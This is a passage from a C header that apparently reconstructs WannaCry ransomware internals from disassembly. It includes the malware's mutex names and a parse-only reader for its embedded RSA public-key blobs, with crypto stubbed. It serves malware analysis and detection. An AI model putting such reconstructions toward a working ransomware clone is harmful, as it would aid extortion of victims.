//   10004690: CreateMutexA(base + 7)  → "MsWinZonesCacheCounterMutexA"
// ===========================================================================
inline const char *wcry_mutex_base(void)         { return "Global\\MsWinZonesCacheCounterMutexA"; }
inline const char *wcry_mutex_open_literal(void) { return "Global\\MsWinZonesCacheCounterMutexW"; }
inline const char *wcry_mutex_base_plus7(void)   { return wcry_mutex_base() + 7; }

// sprintf(fmt@0x1000D4F4, base@0x1000D4FC, instance) — returns 0 ok.
inline int wcry_mutex_build_a0(char *out, size_t cap, int instance)
{
    if (out == NULL || cap == 0) return -1;
    int n = snprintf(out, cap, "%s%d", wcry_mutex_base(), instance);
    return (n > 0 && (size_t)n < cap) ? 0 : -1;
}

// ===========================================================================
// CryptoAPI RSA key-BLOB header walk — PARSE ONLY (no CryptImportKey, no CSP;
// the runtime crypto lane is stubbed in the .cpp). Layout per CryptoAPI:
//   BLOBHEADER { bType, bVersion, reserved u16, aiKeyAlg }  = 8 bytes
//   RSAPUBKEY  { magic[4], bitlen, pubexp }                 = 12 bytes
//   PUBLICKEYBLOB  (bType 6): 20 + bitlen/8                 = 276 (0x114) @2048
//   PRIVATEKEYBLOB (bType 7): 20 + bitlen/8 + 5*bitlen/16 + bitlen/8
//                                           = 1172 @2048 (formats.md §5)
// The binary's two embedded 0x114-byte blobs (@DAT_1000D054 / DAT_1000CF40)
// are PUBLICKEYBLOBs: 06 02 00 00 | 00 A4 00 00 | "RSA1" | 2048 | 65537.
// ===========================================================================
struct WcryKeyBlobInfo {
    int      valid;
    uint8_t  bType;
    uint8_t  bVersion;
    uint32_t aiKeyAlg;      // 0xA400 = CALG_RSA_KEYX
    char     magic[5];      // "RSA1" (public) / "RSA2" (private)
    uint32_t bitlen;
    uint32_t pubexp;
    uint32_t expectedSize;
};

inline int wcry_keyblob_parse(const uint8_t *buf, size_t len, WcryKeyBlobInfo *o)
{
    if (buf == NULL || o == NULL || len < 20) return -1;
    memset(o, 0, sizeof(*o));
    o->bType    = buf[0];
    o->bVersion = buf[1];
    o->aiKeyAlg = wcry_le32(buf + 4);
    memcpy(o->magic, buf + 8, 4);
    o->magic[4] = '\0';
    o->bitlen   = wcry_le32(buf + 12);
    o->pubexp   = wcry_le32(buf + 16);
    if (o->bitlen < 384u || o->bitlen > 16384u || (o->bitlen % 16u) != 0u) return 0;
    const uint32_t bytes = o->bitlen / 8u;
    o->expectedSize = 20u + bytes +
                      ((o->bType == 7u) ? (5u * (bytes / 2u) + bytes) : 0u);
    o->valid = (o->bVersion == 2u) &&
               (o->bType == 6u || o->bType == 7u) &&
               (o->aiKeyAlg == 0xA400u) &&
               ((o->bType == 6u && strcmp(o->magic, "RSA1") == 0) ||
                (o->bType == 7u && strcmp(o->magic, "RSA2") == 0));
    return 0;
}

#endif // WCRY_CORE_H
